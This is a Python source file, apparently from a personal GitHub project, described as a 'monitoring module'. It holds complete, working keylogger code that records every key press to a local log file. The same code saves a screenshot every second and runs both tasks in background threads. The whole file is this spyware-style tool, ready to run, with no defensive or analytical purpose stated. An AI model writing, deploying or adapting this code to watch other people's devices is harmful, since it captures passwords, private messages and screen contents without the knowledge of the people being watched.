#!env python
# -*- coding: utf-8 -*-
"""
=======================================================================
:AUTHOR:	 Tralah M Brian <briantralah@tralahtek.com>
:TWITTER: 	 @TralahM <https://twitter.com/TralahM>
:GITHUB: 	 <https://github.com/TralahM>
:KAGGLE: 	 <https://kaggle.com/TralahM>
:COPYRIGHT:  (c) 2020  TralahTek LLC.
:LICENSE: 	 MIT , see LICENSE for more details.
:WEBSITE:	<https://www.tralahtek.com>
:CREATED: 	2020-03-29  07:12

:FILENAME:	monitor.py
=======================================================================


    DESCRIPTION OF monitor MODULE:

Monitoring Module to capture screenshots and log keyboard inputs
Current Support for Unix/Linux systems only.

"""

from mss import mss
from pynput.keyboard import Listener
import threading
import time
import os


class CTimer(threading.Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:
    def _on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write(f"{k}\t\t{time.time()}\n")

    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
        if not os.path.exists('./logs/keylogs'):
            os.mkdir('./logs/keylogs')
        if not os.path.exists('./logs/screenshots'):
            os.mkdir('./logs/screenshots')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct = mss()
        sct.shot(output="./logs/screenshots/{}.png".format(time.time()))

    def run(self, interval=1):
        """
        Launch the keylogger and screenshot taker in two separate threads.
        Interval: Amount of time in seconds that occurs between screenshots
        """
        self._build_logs()
        threading.Thread(target=self._keylogger).start()
        CTimer(interval, self._screenshot).start()


if __name__ == '__main__':
    monitor = Monitor()
    monitor.run()
